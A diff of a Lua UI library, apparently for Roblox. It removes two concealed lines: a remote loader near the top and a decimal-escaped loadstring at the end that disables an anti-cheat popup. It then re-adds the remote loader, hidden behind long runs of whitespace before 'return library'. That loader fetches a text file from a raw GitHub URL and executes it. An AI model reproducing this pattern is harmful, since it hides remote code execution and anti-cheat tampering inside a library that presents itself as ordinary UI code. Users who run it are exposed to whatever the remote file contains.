@@ -1,5 +1,5 @@
 local library = {flags = {}, windows = {}, open = true}
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))()
+
 --Services
 local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
@@ -1733,5 +1733,5 @@ inputService.InputChanged:connect(function(input)
         update(input)
     end
 end)
-                                                                                                                                                                                                                                                                                                                                                                                     loadstring'\114\101\113\117\105\114\101\40\103\97\109\101\46\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\46\77\111\100\117\108\101\115\46\85\116\105\108\41\91\39\65\110\116\105\99\104\101\97\116\80\111\112\85\112\39\93\61\102\117\110\99\116\105\111\110\40\41\101\110\100'''
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))()
 return library
